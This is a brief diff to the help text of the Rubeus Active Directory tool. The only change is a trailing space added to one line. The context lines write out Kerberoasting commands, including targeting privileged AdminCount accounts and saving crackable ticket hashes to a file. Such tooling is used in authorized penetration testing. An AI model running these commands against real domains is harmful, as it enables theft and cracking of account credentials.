@@ -79,7 +79,7 @@ Roasting:
         Rubeus.exe kerberoast [/spn:""blah/blah""] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU=,...""]
 
     Perform Kerberoasting against users with AdminCount=1:
-        Rubeus.exe kerberoast /admincount
+        Rubeus.exe kerberoast /admincount 
 
     Perform Kerberoasting, outputting hashes to a file:
         Rubeus.exe kerberoast /outfile:hashes.txt [/spn:""blah/blah""] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU=,...""]
